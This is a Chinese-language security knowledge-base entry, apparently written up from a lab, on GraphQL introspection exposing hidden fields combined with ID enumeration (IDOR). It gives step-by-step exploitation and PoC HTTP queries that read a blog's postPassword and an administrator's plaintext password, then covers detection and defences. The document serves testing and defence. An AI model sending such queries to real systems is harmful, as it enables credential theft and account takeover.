---
id: web-generic-graphql-introspection-private-field-exposure
title: GraphQL 内省枚举私有字段：把未公开的 postPassword/password 字段加进查询，配合对象 ID 枚举读他人敏感数据
type: scenario
domain: web
path: web/generic/graphql
technique: graphql-introspection-private-field-exposure
tags:
- graphql
- introspection
- hidden-field
- sensitive-data
- idor
- enumeration
- api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V540
  verified_at: '2026-11-11T19:09:49+08:00'
  notes: 已对照 content.md 与 img01-11、52-56 核对：内省/InQL 发现 getBlogPost.postPassword 与 getUser.password，getBlogPost(id:3) 读出 postPassword，getUser(id:1) 读出 administrator 密码；示例密码笔误已按图11修正为 it26csr9y7u0381oswd1。未验证点：靶场实例已下线，未重放。
url: /docs/web/generic/graphql/web-generic-graphql-introspection-private-field-exposure/
draft: false
kb_aliases:
- GraphQL 隐藏字段泄露
- postPassword 私有字段
- GraphQL private field exposure
- getUser password
- GraphQL ID 枚举
- 内省字段滥用
---

## 一句话结论

GraphQL 客户端可以自由选择返回字段：只要字段存在于 schema，即使前端界面从不展示、正常响应里也从不出现，攻击者通过内省拿到字段名（如 `postPassword`、`password`、`isPrivate`）后把它直接写进查询，服务端就会返回该值；再配合顺序或可猜的对象 ID 逐个枚举，即可跨用户读取敏感数据（文章中读到博客的 postPassword 与其他用户的密码，包括 administrator）。

## 原理

- GraphQL 的响应由查询文档中的字段选择决定，服务端按 schema 执行对应 resolver 并返回结果；“隐藏字段”通常只是前端不请求、UI 不展示，而不是服务端拒绝返回。字段仍留在 schema 里，任何客户端都可以请求。
- 内省（`__schema`/`__type`）会返回类型、字段、参数与返回结构，攻击者据此拿到未公开字段的准确拼写（如 `postPassword`）与查询签名；InQL 等工具可把内省结果直接生成查询模板。
- 常见对象查询按 `id` 取数（如 `getBlogPost(id: 3)`、`getUser(id: 1)`），resolver 往往只校验“已登录”而没有校验“该对象是否属于当前用户”；ID 为自增/可猜时即可枚举他人对象。
- 之所以成立：开发者在 UI 层“隐藏”敏感字段并默认客户端不会请求它，但 GraphQL 的设计就是把字段选择权交给客户端；schema 暴露 + 字段级/对象级授权缺失时，隐藏等于公开。

## 触发条件

- 目标开启内省（或已通过字段建议、前端 JS、历史响应获得 schema）。
- schema 中存在不打算对普通用户开放的敏感字段（密码、私密标记、token、内部备注等），且 resolver 未做字段级/对象级授权。
- 对象查询使用可枚举 ID（自增整数、短 ID），且未校验归属。
- 攻击者持有任意有效账号（部分接口甚至无需登录）。

## 利用步骤

1. 对内省结果（或 InQL 加载的 schema）检索敏感字段名：`password`、`postPassword`、`isPrivate`、`token`、`secret`、`internalNote` 等。
2. 观察正常业务请求的查询文档，记下对象查询与参数（如 `getBlogPost(id: Int!)`）。
3. 在原查询中加入敏感字段后重放，确认响应从“不含该字段”变成返回明文值。
4. 枚举对象 ID（`id: 0/1/2/3...`），对每个 ID 重复查询，收集他人数据；`id: 0` 或不存在时通常返回 `null`，可作为边界判断。
5. 用读到的凭据登录目标账号（如 administrator）验证影响；授权测试中只读取必要的最小数据。

## PoC

```http
POST /graphql HTTP/1.1
Host: target
Content-Type: application/json
Cookie: session=<有效会话>

{"query":"query { getBlogPost(id: 3) { title author postPassword } }"}
```

响应中出现未在正常响应里出现的字段：

```json
{"data":{"getBlogPost":{"title":"...","author":"...","postPassword":"jnb58ddx4qn3c3evcmvgfompe6t2a14g"}}}
```

按用户 ID 枚举并读取密码：

```http
POST /graphql HTTP/1.1
Host: target
Content-Type: application/json

{"query":"query { getUser(id: 1) { id username password } }"}
```

```json
{"data":{"getUser":{"id":1,"username":"administrator","password":"it26csr9y7u0381oswd1"}}}
```

## 变体与关联

- 变体：字段名不一定叫 password；私有对象可用 `isPrivate`/`visibility` 等字段确认，再读其关联内容。
- 变体：不用内省时，可借助字段建议（“Did you mean …?”）、前端打包 JS、旧版客户端查询文档拿到字段名。
- 变体：批量/别名可在单个请求里枚举多个 ID 或多个字段，降低请求数（注意不要造成资源耗尽）。
- 关联：[[web-generic-graphql-endpoint-discovery-schema-enumeration]]（前置的端点发现与 schema 枚举）；[[web-generic-graphql-mutation-missing-function-authz]]（同一内省流程下越权调用管理 mutation）；[[web-generic-graphql-operation-name-authz-field-bypass]]（另一种字段越权机制）。
- 边界：字段级授权校验归属、schema 移除敏感字段、关闭内省且无字段建议时，该手法失效或降级为纯枚举。

## 检测与防御

- 检测：查询文档中出现 schema 中存在但前端从不使用的字段（尤其 password/token 类）；单账号对对象 ID 的连续遍历；内省请求后紧跟敏感字段查询。
- 防御：禁止把敏感字段放入客户端可见 schema（拆分为内部类型/字段）；在 resolver 做字段级与对象级授权，按当前用户过滤可读字段与对象。
- 防御：生产环境关闭内省并关闭字段建议；对象 ID 使用不可枚举的随机标识；对按 ID 取数接口做归属校验与速率限制。
